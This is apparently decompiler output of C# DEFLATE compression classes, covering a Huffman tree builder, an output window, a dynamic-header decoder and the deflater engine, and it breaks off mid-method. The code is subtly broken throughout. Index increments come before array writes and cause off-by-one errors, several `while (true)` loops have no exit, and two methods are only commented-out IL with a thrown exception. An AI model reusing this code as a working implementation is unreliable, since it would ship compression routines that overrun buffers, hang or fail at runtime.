// OutputWindow
public int GetAvailable()
{
    return this.windowFilled;
}
// OutputWindow
public int CopyOutput(byte[] output, int offset, int len)
{
    int local0;
    int local1;
    int local2;

    local0 = this.windowEnd;
    if (len <= this.windowFilled)
    {
        local0 = ((this.windowEnd - this.windowFilled) + len) & 32767;
    }
    else
    {
        len = this.windowFilled;
    }
    local1 = len;
    local2 = len - local0;
    if (local2 > 0)
    {
        System.Array.Copy(this.window, 32768 - local2, output, offset, local2);
        offset = offset + local2;
        len = local0;
    }
    System.Array.Copy(this.window, local0 - len, output, offset, len);
    this.windowFilled = this.windowFilled - local1;
    if (this.windowFilled < 0)
    {
        throw new System.InvalidOperationException();
    }
    return local1;
}
// OutputWindow
public void Reset()
{
    int local0;

    local0 = 0;
    this.windowEnd = 0;
    this.windowFilled = local0;
    return;
}
// OutputWindow
public void .ctor()
{
    this.window = new System.Byte[32768];
    return;
}
// InflaterHuffmanTree
private static void .cctor()
{
    byte[] local0;
    int local1;

    local0 = new System.Byte[288];
    local1 = 0;
    while (local1 < 144)
    {
        local1 = local1 + 1;
        local0[local1] = 8;
        continue;
    }
    while (local1 < 256)
    {
        local1 = local1 + 1;
        local0[local1] = 9;
        continue;
    }
    while (local1 < 280)
    {
        local1 = local1 + 1;
        local0[local1] = 7;
        continue;
    }
    while (local1 < 288)
    {
        local1 = local1 + 1;
        local0[local1] = 8;
        continue;
    }
    defLitLenTree = new InflaterHuffmanTree(local0);
    local0 = new System.Byte[32];
    local1 = 0;
    while (local1 < 32)
    {
        local1 = local1 + 1;
        local0[local1] = 5;
        continue;
    }
    defDistTree = new InflaterHuffmanTree(local0);
    return;
}
// InflaterHuffmanTree
public void .ctor(byte[] codeLengths)
{
    this.BuildTree(codeLengths);
    return;
}
// InflaterHuffmanTree
private void BuildTree(byte[] codeLengths)
{
    int[] local0;
    int[] local1;
    int local2;
    int local3;
    int local4;
    int local5;
    int local6;
    int local7;
    int local8;
    int local9;
    int local10;
    int local11;
    int local12;
    int local13;
    int local14;
    int local15;
    int local16;
    int local17;

    local0 = new System.Int32[16];
    local1 = new System.Int32[16];
    local5 = 0;
    while (local5 < ((int)codeLengths.Length))
    {
        local6 = codeLengths[local5];
        if (local6 > 0)
        {
            local0[local6] = (*(&local0[local6])) + 1;
            local5 = local5 + 1;
            continue;
        }
        local5 = local5 + 1;
        continue;
    }
    local2 = 0;
    local3 = 512;
    local7 = 1;
    while (local7 <= 15)
    {
        local1[local7] = local2;
        local2 = local2 + (local0[local7] << ((16 - local7) & 31));
        if (local7 >= 10)
        {
            local8 = local1[local7] & 130944;
            local9 = local2 & 130944;
            local3 = local3 + ((local9 - local8) >> ((16 - local7) & 31));
            local7 = local7 + 1;
            continue;
        }
        local7 = local7 + 1;
        continue;
    }
    this.tree = new System.Int16[local3];
    local4 = 512;
    local10 = 15;
    while (local10 >= 10)
    {
        local11 = local2 & 130944;
        local2 = local2 - (local0[local10] << ((16 - local10) & 31));
        local12 = local2 & 130944;
        while (local12 < local11)
        {
            this.tree[DeflaterHuffman.BitReverse(local12)] = (short)(((-local4) << 4) | local10);
            local4 = local4 + (1 << ((local10 - 9) & 31));
            local12 = local12 + 128;
            continue;
        }
        local10 = local10 - 1;
        continue;
    }
    local13 = 0;
    while (local13 < ((int)codeLengths.Length))
    {
        local14 = codeLengths[local13];
        if (local14 != 0)
        {
            local2 = local1[local14];
            local15 = DeflaterHuffman.BitReverse(local2);
            if (local14 > 9)
            {
                local16 = this.tree[local15 & 511];
                local17 = 1 << ((local16 & 15) & 31);
                local16 = -(local16 >> 4);
                while (true)
                {
                    this.tree[local16 | (local15 >> 9)] = (short)((local13 << 4) | local14);
                    local15 = local15 + (1 << (local14 & 31));
                    if (local15 < local17)
                    {
                        continue;
                    }
                }
            }
            else
            {
                while (true)
                {
                    this.tree[local15] = (short)((local13 << 4) | local14);
                    local15 = local15 + (1 << (local14 & 31));
                    if (local15 < 512)
                    {
                        continue;
                    }
                }
            }
            local1[local14] = local2 + (1 << ((16 - local14) & 31));
            local13 = local13 + 1;
            continue;
        }
        local13 = local13 + 1;
        continue;
    }
    return;
}
// InflaterHuffmanTree
public int GetSymbol(StreamManipulator input)
{
    int local0;
    int local1;
    int local2;
    int local3;
    int local4;
    int local5;

    local0 = input.PeekBits(9);
    if (input.PeekBits(9) >= 0)
    {
        local1 = this.tree[local0];
        if (this.tree[local0] >= 0)
        {
            input.DropBits(local1 & 15);
            return local1 >> 4;
        }
        local2 = -(local1 >> 4);
        local3 = local1 & 15;
        local0 = input.PeekBits(local3);
        if (input.PeekBits(local3) >= 0)
        {
            local1 = this.tree[local2 | (local0 >> 9)];
            input.DropBits(local1 & 15);
            return local1 >> 4;
        }
        local4 = input.AvailableBits;
        local0 = input.PeekBits(local4);
        local1 = this.tree[local2 | (local0 >> 9)];
        if ((local1 & 15) <= local4)
        {
            input.DropBits(local1 & 15);
            return local1 >> 4;
        }
        return -1;
    }
    local5 = input.AvailableBits;
    local0 = input.PeekBits(local5);
    local1 = this.tree[local0];
    if (!(local1 < 0 || (local1 & 15) > local5))
    {
        input.DropBits(local1 & 15);
        return local1 >> 4;
    }
    return -1;
}
// InflaterDynHeader
public void .ctor()
{
    return;
}
// InflaterDynHeader
public bool Decode(StreamManipulator input)
{
    // disrobe: unstructured control flow has no legal target scope: goto IL_005F has no legal target scope; the compiler-emitted plumbing below is kept verbatim as the only static evidence
    // int local0;
    // int local1;
    // int local2;
    // int local3;
    // byte local4;
    // int local5;
    // int local6;
    // IL_0000:;
    // while (true)
    // {
    // local0 = this.mode;
    // switch (local0)
    // {
    // case 0:
    // this.lnum = input.PeekBits(5);
    // if (this.lnum >= 0)
    // {
    // this.lnum = this.lnum + 257;
    // input.DropBits(5);
    // this.mode = 1;
    // IL_005F:;
    // this.dnum = input.PeekBits(5);
    // if (this.dnum >= 0)
    // {
    // this.dnum = this.dnum + 1;
    // input.DropBits(5);
    // this.num = this.lnum + this.dnum;
    // this.litdistLens = new System.Byte[this.num];
    // this.mode = 2;
    // IL_00B7:;
    // this.blnum = input.PeekBits(4);
    // if (this.blnum >= 0)
    // {
    // this.blnum = this.blnum + 4;
    // input.DropBits(4);
    // this.blLens = new System.Byte[19];
    // this.ptr = 0;
    // this.mode = 3;
    // IL_0139:;
    // while (true)
    // {
    // if (this.ptr < this.blnum)
    // {
    // local1 = input.PeekBits(3);
    // if (local1 >= 0)
    // {
    // input.DropBits(3);
    // this.blLens[BL_ORDER[this.ptr]] = (byte)local1;
    // this.ptr = this.ptr + 1;
    // continue;
    // }
    // return false;
    // }
    // else
    // {
    // this.blTree = new InflaterHuffmanTree(this.blLens);
    // this.blLens = null;
    // this.ptr = 0;
    // this.mode = 4;
    // IL_01A4:;
    // while (true)
    // {
    // local2 = this.blTree.GetSymbol(input);
    // if ((this.blTree.GetSymbol(input) & -16) == 0)
    // {
    // local3 = this.ptr;
    // this.ptr = local3 + 1;
    // local4 = (byte)local2;
    // this.lastLen = (byte)local2;
    // this.litdistLens[local3] = local4;
    // if (this.ptr != this.num)
    // {
    // continue;
    // }
    // return true;
    // }
    // else
    // {
    // if (local2 >= 0)
    // {
    // if (local2 >= 17)
    // {
    // this.lastLen = 0;
    // }
    // this.repSymbol = local2 - 16;
    // this.mode = 5;
    // IL_01DA:;
    // local5 = repBits[this.repSymbol];
    // local6 = input.PeekBits(local5);
    // if (local6 >= 0)
    // {
    // input.DropBits(local5);
    // local6 = local6 + repMin[this.repSymbol];
    // while (true)
    // {
    // local6 = local6 - 1;
    // if (local6 > 0)
    // {
    // local3 = this.ptr;
    // this.ptr = local3 + 1;
    // this.litdistLens[local3] = this.lastLen;
    // continue;
    // }
    // }
    // if (this.ptr != this.num)
    // {
    // this.mode = 4;
    // goto IL_0000;
    // }
    // return true;
    // }
    // return false;
    // }
    // return false;
    // }
    // }
    // }
    // }
    // }
    // return false;
    // }
    // return false;
    // }
    // return false;
    // case 1:
    // goto IL_005F;
    // case 2:
    // goto IL_00B7;
    // case 3:
    // goto IL_0139;
    // case 4:
    // goto IL_01A4;
    // case 5:
    // goto IL_01DA;
    // default:
    // continue;
    // }
    // }
    throw new System.NotSupportedException("disrobe: unstructured control flow has no legal target scope");
}
// InflaterDynHeader
public InflaterHuffmanTree BuildLitLenTree()
{
    byte[] local0;

    local0 = new System.Byte[this.lnum];
    System.Array.Copy(this.litdistLens, 0, local0, 0, this.lnum);
    return new InflaterHuffmanTree(local0);
}
// InflaterDynHeader
public InflaterHuffmanTree BuildDistTree()
{
    byte[] local0;

    local0 = new System.Byte[this.dnum];
    System.Array.Copy(this.litdistLens, this.lnum, local0, 0, this.dnum);
    return new InflaterHuffmanTree(local0);
}
// InflaterDynHeader
private static void .cctor()
{
    repMin = new System.Int32[3] { 3, 3, 11 };
    repBits = new System.Int32[3] { 2, 3, 7 };
    BL_ORDER = new System.Int32[19] { 16, 17, 18, 0, 8, 7, 9, 6, 10, 5, 11, 4, 12, 3, 13, 2, 14, 1, 15 };
    return;
}
// Deflater
public void .ctor()
{
    this.state = 16;
    this.pending = new DeflaterPending();
    this.engine = new DeflaterEngine(this.pending);
    return;
}
// Deflater
public long get_TotalOut()
{
    return this.totalOut;
}
// Deflater
public void Finish()
{
    this.state = this.state | 12;
    return;
}
// Deflater
public bool get_IsFinished()
{
    if (this.state == 30)
    {
        return this.pending.IsFlushed;
    }
    return false;
}
// Deflater
public bool get_IsNeedingInput()
{
    return this.engine.NeedsInput();
}
// Deflater
public void SetInput(byte[] buffer)
{
    this.engine.SetInput(buffer);
    return;
}
// Deflater
public int Deflate(byte[] output)
{
    int local0;
    int local1;
    int local2;
    int local3;
    int local4;

    local0 = 0;
    local1 = (int)output.Length;
    local2 = local1;
    while (true)
    {
        local3 = this.pending.Flush(output, local0, local1);
        local0 = local0 + local3;
        this.totalOut = this.totalOut + ((long)local3);
        local1 = local1 - local3;
        if (!(local1 == 0 || this.state == 30))
        {
            if (!(this.engine.Deflate((this.state & 4) > 0, (this.state & 8) > 0)))
            {
                if (this.state != 16)
                {
                    if (this.state != 20)
                    {
                        if (this.state == 28)
                        {
                            this.pending.AlignToByte();
                            this.state = 30;
                            continue;
                        }
                    }
                    else
                    {
                        local4 = 8 + ((-this.pending.BitCount) & 7);
                        while (local4 > 0)
                        {
                            this.pending.WriteBits(2, 10);
                            local4 = local4 - 10;
                            continue;
                        }
                        this.state = 16;
                        continue;
                    }
                }
                return local2 - local1;
            }
        }
    }
}
// DeflaterHuffman
public static short BitReverse(int toReverse)
{
    return (short)((((bit4Reverse[toReverse & 15] << 12) | (bit4Reverse[(toReverse >> 4) & 15] << 8)) | (bit4Reverse[(toReverse >> 8) & 15] << 4)) | bit4Reverse[toReverse >> 12]);
}
// DeflaterHuffman
private static void .cctor()
{
    int local0;

    BL_ORDER = new System.Int32[19] { 16, 17, 18, 0, 8, 7, 9, 6, 10, 5, 11, 4, 12, 3, 13, 2, 14, 1, 15 };
    bit4Reverse = new System.Byte[16] { 0, 8, 4, 12, 2, 10, 6, 14, 1, 9, 5, 13, 3, 11, 7, 15 };
    staticLCodes = new System.Int16[286];
    staticLLength = new System.Byte[286];
    local0 = 0;
    while (local0 < 144)
    {
        staticLCodes[local0] = DeflaterHuffman.BitReverse((48 + local0) << 8);
        local0 = local0 + 1;
        staticLLength[local0] = 8;
        continue;
    }
    while (local0 < 256)
    {
        staticLCodes[local0] = DeflaterHuffman.BitReverse((256 + local0) << 7);
        local0 = local0 + 1;
        staticLLength[local0] = 9;
        continue;
    }
    while (local0 < 280)
    {
        staticLCodes[local0] = DeflaterHuffman.BitReverse((-256 + local0) << 9);
        local0 = local0 + 1;
        staticLLength[local0] = 7;
        continue;
    }
    while (local0 < 286)
    {
        staticLCodes[local0] = DeflaterHuffman.BitReverse((-88 + local0) << 8);
        local0 = local0 + 1;
        staticLLength[local0] = 8;
        continue;
    }
    staticDCodes = new System.Int16[30];
    staticDLength = new System.Byte[30];
    local0 = 0;
    while (local0 < 30)
    {
        staticDCodes[local0] = DeflaterHuffman.BitReverse(local0 << 11);
        staticDLength[local0] = 5;
        local0 = local0 + 1;
        continue;
    }
    return;
}
// DeflaterHuffman
public void .ctor(DeflaterPending pending)
{
    this.pending = pending;
    this.literalTree = new Tree(this, 286, 257, 15);
    this.distTree = new Tree(this, 30, 1, 15);
    this.blTree = new Tree(this, 19, 4, 7);
    this.d_buf = new System.Int16[16384];
    this.l_buf = new System.Byte[16384];
    return;
}
// DeflaterHuffman
public void Init()
{
    this.last_lit = 0;
    this.extra_bits = 0;
    return;
}
// DeflaterHuffman
private int Lcode(int len)
{
    int local0;

    if (len == 255)
    {
        return 285;
    }
    local0 = 257;
    while (len >= 8)
    {
        local0 = local0 + 4;
        len = len >> 1;
        continue;
    }
    return local0 + len;
}
// DeflaterHuffman
private int Dcode(int distance)
{
    int local0;

    local0 = 0;
    while (distance >= 4)
    {
        local0 = local0 + 2;
        distance = distance >> 1;
        continue;
    }
    return local0 + distance;
}
// DeflaterHuffman
public void SendAllTrees(int blTreeCodes)
{
    int local0;

    this.blTree.BuildCodes();
    this.literalTree.BuildCodes();
    this.distTree.BuildCodes();
    this.pending.WriteBits(this.literalTree.numCodes - 257, 5);
    this.pending.WriteBits(this.distTree.numCodes - 1, 5);
    this.pending.WriteBits(blTreeCodes - 4, 4);
    local0 = 0;
    while (local0 < blTreeCodes)
    {
        this.pending.WriteBits(this.blTree.length[BL_ORDER[local0]], 3);
        local0 = local0 + 1;
        continue;
    }
    this.literalTree.WriteTree(this.blTree);
    this.distTree.WriteTree(this.blTree);
    return;
}
// DeflaterHuffman
public void CompressBlock()
{
    int local0;
    int local1;
    int local2;
    int local3;
    int local4;
    int local5;

    local0 = 0;
    while (local0 < this.last_lit)
    {
        local1 = this.l_buf[local0] & 255;
        local2 = this.d_buf[local0];
        local2 = local2 - 1;
        if (local2 == 0)
        {
            this.literalTree.WriteSymbol(local1);
            local0 = local0 + 1;
            continue;
        }
        else
        {
            local3 = this.Lcode(local1);
            this.literalTree.WriteSymbol(local3);
            local4 = (local3 - 261) / 4;
            if (!(local4 <= 0 || local4 > 5))
            {
                this.pending.WriteBits(local1 & ((1 << (local4 & 31)) - 1), local4);
            }
            local5 = this.Dcode(local2);
            this.distTree.WriteSymbol(local5);
            local4 = (local5 / 2) - 1;
            if (local4 > 0)
            {
                this.pending.WriteBits(local2 & ((1 << (local4 & 31)) - 1), local4);
                local0 = local0 + 1;
                continue;
            }
            local0 = local0 + 1;
            continue;
        }
        local0 = local0 + 1;
        continue;
    }
    this.literalTree.WriteSymbol(256);
    return;
}
// DeflaterHuffman
public void FlushStoredBlock(byte[] stored, int storedOffset, int storedLength, bool lastBlock)
{
    this.pending.WriteBits((lastBlock ? 1 : 0), 3);
    this.pending.AlignToByte();
    this.pending.WriteShort(storedLength);
    this.pending.WriteShort(~storedLength);
    this.pending.WriteBlock(stored, storedOffset, storedLength);
    this.Init();
    return;
}
// DeflaterHuffman
public void FlushBlock(byte[] stored, int storedOffset, int storedLength, bool lastBlock)
{
    int local0;
    int local1;
    int local2;
    int local3;
    int local4;
    int local5;

    this.literalTree.freqs[256] = (short)((*(&this.literalTree.freqs[256])) + 1);
    this.literalTree.BuildTree();
    this.distTree.BuildTree();
    this.literalTree.CalcBLFreq(this.blTree);
    this.distTree.CalcBLFreq(this.blTree);
    this.blTree.BuildTree();
    local0 = 4;
    local3 = 18;
    while (local3 > local0)
    {
        if (this.blTree.length[BL_ORDER[local3]] > 0)
        {
            local0 = local3 + 1;
            local3 = local3 - 1;
            continue;
        }
        local3 = local3 - 1;
        continue;
    }
    local1 = ((((14 + (local0 * 3)) + this.blTree.GetEncodedLength()) + this.literalTree.GetEncodedLength()) + this.distTree.GetEncodedLength()) + this.extra_bits;
    local2 = this.extra_bits;
    local4 = 0;
    while (local4 < 286)
    {
        local2 = local2 + (this.literalTree.freqs[local4] * staticLLength[local4]);
        local4 = local4 + 1;
        continue;
    }
    local5 = 0;
    while (local5 < 30)
    {
        local2 = local2 + (this.distTree.freqs[local5] * staticDLength[local5]);
        local5 = local5 + 1;
        continue;
    }
    if (local1 >= local2)
    {
        local1 = local2;
    }
    if (!(storedOffset < 0 || (storedLength + 4) >= (local1 >> 3)))
    {
        this.FlushStoredBlock(stored, storedOffset, storedLength, lastBlock);
        return;
    }
    if (local1 == local2)
    {
        this.pending.WriteBits(2 + ((lastBlock ? 1 : 0)), 3);
        this.literalTree.SetStaticCodes(staticLCodes, staticLLength);
        this.distTree.SetStaticCodes(staticDCodes, staticDLength);
        this.CompressBlock();
        this.Init();
        return;
    }
    this.pending.WriteBits(4 + ((lastBlock ? 1 : 0)), 3);
    this.SendAllTrees(local0);
    this.CompressBlock();
    this.Init();
    return;
}
// DeflaterHuffman
public bool IsFull()
{
    return (this.last_lit < 16384) == false;
}
// DeflaterHuffman
public bool TallyLit(int lit)
{
    int local0;

    this.d_buf[this.last_lit] = 0;
    local0 = this.last_lit;
    this.last_lit = local0 + 1;
    this.l_buf[local0] = (byte)lit;
    this.literalTree.freqs[lit] = (short)((*(&this.literalTree.freqs[lit])) + 1);
    return this.IsFull();
}
// DeflaterHuffman
public bool TallyDist(int dist, int len)
{
    int local0;
    int local1;
    int local2;

    this.d_buf[this.last_lit] = (short)dist;
    local2 = this.last_lit;
    this.last_lit = local2 + 1;
    this.l_buf[local2] = (byte)(len - 3);
    local0 = this.Lcode(len - 3);
    this.literalTree.freqs[local0] = (short)((*(&this.literalTree.freqs[local0])) + 1);
    if (!(local0 < 265 || local0 >= 285))
    {
        this.extra_bits = this.extra_bits + ((local0 - 261) / 4);
    }
    local1 = this.Dcode(dist - 1);
    this.distTree.freqs[local1] = (short)((*(&this.distTree.freqs[local1])) + 1);
    if (local1 >= 4)
    {
        this.extra_bits = this.extra_bits + ((local1 / 2) - 1);
    }
    return this.IsFull();
}
// Tree
public void .ctor(DeflaterHuffman dh, int elems, int minCodes, int maxLength)
{
    this.dh = dh;
    this.minNumCodes = minCodes;
    this.maxLength = maxLength;
    this.freqs = new System.Int16[elems];
    this.bl_counts = new System.Int32[maxLength];
    return;
}
// Tree
public void WriteSymbol(int code)
{
    this.dh.pending.WriteBits(this.codes[code] & 65535, this.length[code]);
    return;
}
// Tree
public void SetStaticCodes(short[] stCodes, byte[] stLength)
{
    this.codes = stCodes;
    this.length = stLength;
    return;
}
// Tree
public void BuildCodes()
{
    int[] local0;
    int local1;
    int local2;
    int local3;
    int local4;

    local0 = new System.Int32[this.maxLength];
    local1 = 0;
    this.codes = new System.Int16[(int)this.freqs.Length];
    local2 = 0;
    while (local2 < this.maxLength)
    {
        local0[local2] = local1;
        local1 = local1 + (this.bl_counts[local2] << ((15 - local2) & 31));
        local2 = local2 + 1;
        continue;
    }
    local3 = 0;
    while (local3 < this.numCodes)
    {
        local4 = this.length[local3];
        if (local4 > 0)
        {
            this.codes[local3] = DeflaterHuffman.BitReverse(local0[local4 - 1]);
            local0[local4 - 1] = (*(&local0[local4 - 1])) + (1 << ((16 - local4) & 31));
            local3 = local3 + 1;
            continue;
        }
        local3 = local3 + 1;
        continue;
    }
    return;
}
// Tree
private void BuildLength(int[] childs)
{
    int local0;
    int local1;
    int local2;
    int[] local3;
    int local4;
    int local5;
    int local6;
    int local7;
    int local8;
    int local9;
    int local10;
    int local11;
    int local12;
    int local13;

    this.length = new System.Byte[(int)this.freqs.Length];
    local0 = ((int)childs.Length) / 2;
    local1 = (local0 + 1) / 2;
    local2 = 0;
    local6 = 0;
    while (local6 < this.maxLength)
    {
        this.bl_counts[local6] = 0;
        local6 = local6 + 1;
        continue;
    }
    local3 = new System.Int32[local0];
    local3[local0 - 1] = 0;
    local7 = local0 - 1;
    while (local7 >= 0)
    {
        if (childs[(2 * local7) + 1] == -1)
        {
            local10 = local3[local7];
            this.bl_counts[local10 - 1] = (*(&this.bl_counts[local10 - 1])) + 1;
            this.length[childs[2 * local7]] = (byte)local3[local7];
            local7 = local7 - 1;
            continue;
        }
        else
        {
            local8 = local3[local7] + 1;
            if (local8 > this.maxLength)
            {
                local8 = this.maxLength;
                local2 = local2 + 1;
            }
            local9 = local8;
            local3[childs[(2 * local7) + 1]] = local8;
            local3[childs[2 * local7]] = local9;
            local7 = local7 - 1;
            continue;
        }
        local7 = local7 - 1;
        continue;
    }
    if (local2 == 0)
    {
        return;
    }
    local4 = this.maxLength - 1;
    while (true)
    {
        local4 = local4 - 1;
        if (!this.bl_counts[local4 - 1])
        {
            continue;
        }
    }
    this.bl_counts[this.maxLength - 1] = (*(&this.bl_counts[this.maxLength - 1])) + local2;
    this.bl_counts[this.maxLength - 2] = (*(&this.bl_counts[this.maxLength - 2])) - local2;
    local5 = 2 * local1;
    local11 = this.maxLength;
    while (local11 != 0)
    {
        local12 = this.bl_counts[local11 - 1];
        while (local12 > 0)
        {
            local5 = local5 + 1;
            local13 = 2 * childs[local5];
            if (childs[local13 + 1] == -1)
            {
                this.length[childs[local13]] = (byte)local11;
                local12 = local12 - 1;
                continue;
            }
        }
        local11 = local11 - 1;
        continue;
    }
    return;
}
// Tree
public void BuildTree()
{
    int local0;
    int[] local1;
    int local2;
    int local3;
    int[] local4;
    int[] local5;
    int local6;
    int local7;
    int local8;
    int local9;
    int local10;
    int local11;
    int local12;
    int local13;
    int local14;
    int local15;
    int local16;
    int local17;
    int local18;
    int local19;
    int local20;

    local0 = (int)this.freqs.Length;
    local1 = new System.Int32[local0];
    local2 = 0;
    local3 = 0;
    local7 = 0;
IL_0067:;
    while (local7 < local0)
    {
        local8 = this.freqs[local7];
        if (local8 != 0)
        {
            local2 = local2 + 1;
            local9 = local2;
            while (local9 > 0)
            {
                local10 = (local9 - 1) / 2;
                if (this.freqs[local1[(local9 - 1) / 2]] > local8)
                {
                    local1[local9] = local1[local10];
                    local9 = local10;
                    continue;
                }
                local1[local9] = local7;
                local3 = local7;
                local7 = local7 + 1;
                goto IL_0067;
            }
        }
    }
    while (local2 < 2)
    {
        local11 = (local3 < 2 ? (local3 = local3 + 1) : 0);
        local2 = local2 + 1;
        local1[local2] = local11;
        continue;
    }
    this.numCodes = System.Math.Max(local3 + 1, this.minNumCodes);
    local4 = new System.Int32[(4 * local2) - 2];
    local5 = new System.Int32[(2 * local2) - 1];
    local6 = local2;
    local12 = 0;
    while (local12 < local2)
    {
        local13 = local1[local12];
        local4[2 * local12] = local13;
        local4[(2 * local12) + 1] = -1;
        local5[local12] = this.freqs[local13] << 8;
        local1[local12] = local12;
        local12 = local12 + 1;
        continue;
    }
    while (true)
    {
        local14 = local1[0];
        local2 = local2 - 1;
        local15 = local1[local2 - 1];
        local16 = 0;
        local17 = 1;
    }
    this.BuildLength(local4);
    return;
}
// Tree
public int GetEncodedLength()
{
    int local0;
    int local1;

    local0 = 0;
    local1 = 0;
    while (local1 < ((int)this.freqs.Length))
    {
        local0 = local0 + (this.freqs[local1] * this.length[local1]);
        local1 = local1 + 1;
        continue;
    }
    return local0;
}
// Tree
public void CalcBLFreq(Tree blTree)
{
    int local0;
    int local1;
    int local2;
    int local3;
    int local4;
    int local5;

    local3 = -1;
    local4 = 0;
    while (local4 < this.numCodes)
    {
        local2 = 1;
        local5 = this.length[local4];
        if (local5 != 0)
        {
            local0 = 6;
            local1 = 3;
            if (local3 != local5)
            {
                blTree.freqs[local5] = (short)((*(&blTree.freqs[local5])) + 1);
                local2 = 0;
            }
        }
        else
        {
            local0 = 138;
            local1 = 3;
        }
        local3 = local5;
        local4 = local4 + 1;
        while (local4 < this.numCodes)
        {
            if (local3 == this.length[local4])
            {
                local4 = local4 + 1;
                local2 = local2 + 1;
                if ((local2 + 1) < local0)
                {
                    continue;
                }
                break;
            }
            if (local2 >= local1)
            {
                if (local3 == 0)
                {
                    if (local2 > 10)
                    {
                        blTree.freqs[18] = (short)((*(&blTree.freqs[18])) + 1);
                    }
                    else
                    {
                        blTree.freqs[17] = (short)((*(&blTree.freqs[17])) + 1);
                    }
                }
                else
                {
                    blTree.freqs[16] = (short)((*(&blTree.freqs[16])) + 1);
                }
            }
            else
            {
                blTree.freqs[local3] = (short)((*(&blTree.freqs[local3])) + ((short)local2));
            }
        }
    }
    return;
}
// Tree
public void WriteTree(Tree blTree)
{
    int local0;
    int local1;
    int local2;
    int local3;
    int local4;
    int local5;

    local3 = -1;
    local4 = 0;
    while (local4 < this.numCodes)
    {
        local2 = 1;
        local5 = this.length[local4];
        if (local5 != 0)
        {
            local0 = 6;
            local1 = 3;
            if (local3 != local5)
            {
                blTree.WriteSymbol(local5);
                local2 = 0;
            }
        }
        else
        {
            local0 = 138;
            local1 = 3;
        }
        local3 = local5;
        local4 = local4 + 1;
        while (local4 < this.numCodes)
        {
            if (local3 == this.length[local4])
            {
                local4 = local4 + 1;
                local2 = local2 + 1;
                if ((local2 + 1) < local0)
                {
                    continue;
                }
                break;
            }
            if (local2 >= local1)
            {
                if (local3 == 0)
                {
                    if (local2 > 10)
                    {
                        blTree.WriteSymbol(18);
                        this.dh.pending.WriteBits(local2 - 11, 7);
                    }
                    else
                    {
                        blTree.WriteSymbol(17);
                        this.dh.pending.WriteBits(local2 - 3, 3);
                    }
                }
                else
                {
                    blTree.WriteSymbol(16);
                    this.dh.pending.WriteBits(local2 - 3, 2);
                }
            }
            else
            {
                while (true)
                {
                    local2 = local2 - 1;
                    if (local2 > 0)
                    {
                        blTree.WriteSymbol(local3);
                        continue;
                    }
                }
            }
        }
    }
    return;
}
// DeflaterEngine
public void .ctor(DeflaterPending pending)
{
    int local0;

    this.pending = pending;
    this.huffman = new DeflaterHuffman(pending);
    this.window = new System.Byte[65536];
    this.head = new System.Int16[32768];
    this.prev = new System.Int16[32768];
    local0 = 1;
    this.strstart = 1;
    this.blockStart = local0;
    return;
}
// DeflaterEngine
private void UpdateHash()
{
    this.ins_h = (this.window[this.strstart] << 5) ^ this.window[this.strstart + 1];
    return;
}
// DeflaterEngine
private int InsertString()
{
    short local0;
    int local1;

    local1 = ((this.ins_h << 5) ^ this.window[this.strstart + 2]) & 32767;
    local0 = this.head[local1];
    this.prev[this.strstart & 32767] = this.head[local1];
    this.head[local1] = (short)this.strstart;
    this.ins_h = local1;
    return local0 & 65535;
}
// DeflaterEngine
private void SlideWindow()
{
    int local0;
    int local1;
    int local2;
    int local3;

    System.Array.Copy(this.window, 32768, this.window, 0, 32768);
    this.matchStart = this.matchStart - 32768;
    this.strstart = this.strstart - 32768;
    this.blockStart = this.blockStart - 32768;
    local0 = 0;
    while (local0 < 32768)
    {
        local1 = this.head[local0] & 65535;
        this.head[local0] = (short)((local1 >= 32768 ? (local1 - 32768) : 0));
        local0 = local0 + 1;
        continue;
    }
    local2 = 0;
    while (local2 < 32768)
    {
        local3 = this.prev[local2] & 65535;
        this.prev[local2] = (short)((local3 >= 32768 ? (local3 - 32768) : 0));
        local2 = local2 + 1;
        continue;
    }
    return;
}
// DeflaterEngine
public void FillWindow()
{
    int local0;

    if (this.strstart >= 65274)
    {
        this.SlideWindow();
    }
    while (this.lookahead < 262)
    {
        if (this.inputOff < this.inputEnd)
        {
            local0 = (65536 - this.lookahead) - this.strstart;
            if (local0 > (this.inputEnd - this.inputOff))
            {
                local0 = this.inputEnd - this.inputOff;
                System.Array.Copy(this.inputBuf, this.inputOff, this.window, this.strstart + this.lookahead, local0);
                this.inputOff = this.inputOff + local0;
                this.totalIn = this.totalIn + local0;
                this.lookahead = this.lookahead + local0;
                continue;
            }
            System.Array.Copy(this.inputBuf, this.inputOff, this.window, this.strstart + this.lookahead, local0);
            this.inputOff = this.inputOff + local0;
            this.totalIn = this.totalIn + local0;
            this.lookahead = this.lookahead + local0;
            continue;
        }
        if (this.lookahead >= 3)
        {
            this.UpdateHash();
        }
        return;
    }
}
// DeflaterEngine
private bool FindLongestMatch(int curMatch)
{
    // disrobe: unstructured control flow has no legal target scope: goto IL_0217 has no legal target scope; the compiler-emitted plumbing below is kept verbatim as the only static evidence
    // int local0;
    // int local1;
    // short[] local2;
    // int local3;
    // int local4;
    // int local5;
    // int local6;
    // int local7;
    // int local8;
    // byte local9;
    // byte local10;
    // local0 = 128;
    // local1 = 128;
    // local2 = this.prev;
    // local3 = this.strstart;
    // local5 = this.strstart + this.matchLen;
    // local6 = System.Math.Max(this.matchLen, 2);
    // local7 = System.Math.Max(this.strstart - 32506, 0);
    // local8 = (this.strstart + 258) - 1;
    // local9 = this.window[local5 - 1];
    // local10 = this.window[local5];
    // if (local6 >= 8)
    // {
    // local0 = local0 >> 2;
    // }
    // if (local1 > this.lookahead)
    // {
    // local1 = this.lookahead;
    // }
    // while (true)
    // {
    // if (((this.window[curMatch + local6] != local10 || this.window[(curMatch + local6) - 1] != local9) || this.window[curMatch] != this.window[local3]) || this.window[curMatch + 1] != this.window[local3 + 1])
    // {
    // IL_0217:;
    // curMatch = local2[curMatch & 32767] & 65535;
    // if ((local2[curMatch & 32767] & 65535) > local7)
    // {
    // local0 = local0 - 1;
    // if ((local0 - 1) != 0)
    // {
    // continue;
    // }
    // break;
    // }
    // break;
    // }
    // else
    // {
    // local4 = curMatch + 2;
    // local3 = local3 + 2;
    // while (true)
    // {
    // local3 = local3 + 1;
    // local4 = local4 + 1;
    // if (this.window[local3 + 1] == this.window[local4 + 1])
    // {
    // local3 = local3 + 1;
    // local4 = local4 + 1;
    // if (this.window[local3 + 1] == this.window[local4 + 1])
    // {
    // local3 = local3 + 1;
    // local4 = local4 + 1;
    // if (this.window[local3 + 1] == this.window[local4 + 1])
    // {
    // local3 = local3 + 1;
    // local4 = local4 + 1;
    // if (this.window[local3 + 1] == this.window[local4 + 1])
    // {
    // local3 = local3 + 1;
    // local4 = local4 + 1;
    // if (this.window[local3 + 1] == this.window[local4 + 1])
    // {
    // local3 = local3 + 1;
